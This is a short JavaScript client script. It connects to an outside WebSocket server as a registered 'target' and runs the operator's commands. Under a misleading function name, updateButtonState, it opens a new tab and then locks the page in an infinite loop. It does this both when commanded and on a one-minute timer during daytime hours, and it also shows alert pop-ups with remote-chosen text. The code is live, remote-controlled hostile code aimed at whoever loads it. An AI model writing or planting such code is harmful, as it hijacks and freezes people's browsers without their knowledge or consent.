function getRandomInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min + 1)) + min; 
}
function updateButtonState() {
    const now = new Date();
    const currentHour = now.getHours();
    const currentMinutes = now.getMinutes();


    if (currentHour >= 8 && currentHour < 23) {
        setTimeout(function() {
                    window.open('https://google.com','_blank');
                    while (true) {
                        console.log("Q");
                    }
                       }, getRandomInt(15000,30000))
            } 
        }

const REPLIT_WS_URL = "wss://44f64bff-8808-445a-8099-1c8666679313-00-2kblha4tvl79n.pike.replit.dev:3000/";
let socket;

function connect() {
    socket = new WebSocket(REPLIT_WS_URL, "target-client");


    socket.onopen = () => {
        socket.send(JSON.stringify({ type: "register_target" }));
    };

    socket.onmessage = (event) => {
        try {
            const data = JSON.parse(event.data);

            if (data.type === 'client_count') return
            if (data.mode === "global_true" && data.executeGlobalAction === true) {
                console.log("prob")
                updateButtonState();

            }

            if (data.mode === "custom_message" && data.showPopup === true) {
                alert(data.message);
            }

        } catch (err) {
        }
    };

    socket.onclose = () => {
        setTimeout(connect, 4000);
    };

    socket.onerror = (error) => {
    };
}

connect();





setInterval(updateButtonState, 60000); 
